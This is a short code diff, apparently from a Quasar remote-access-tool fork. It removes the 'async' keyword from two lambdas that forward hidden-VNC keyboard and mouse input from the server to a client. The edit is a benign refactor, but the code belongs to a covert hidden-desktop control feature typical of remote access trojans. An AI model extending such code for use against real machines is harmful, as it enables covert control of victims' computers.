@@ -295,7 +295,7 @@ namespace Quasar.Server.Controls
                     long IwParam = wParam.ToInt64();
                     long IlParam = lParam.ToInt64();
 
-                    Task.Run(async () =>
+                    Task.Run(() =>
                     {
                         client.Send(new DoHVNCInput { msg = msg, wParam = (int)IwParam, lParam = (int)IlParam });
                     }).Wait();
@@ -347,7 +347,7 @@ namespace Quasar.Server.Controls
                         Imsg = (long)msg;
                         IwParam = wParam.ToInt64();
                         IlParam = lParam.ToInt64();
-                        Task.Run(async () =>
+                        Task.Run(() =>
                         {
                             client.Send(new DoHVNCInput { msg = msg, wParam = (int)IwParam, lParam = (int)IlParam });
                         }).Wait();
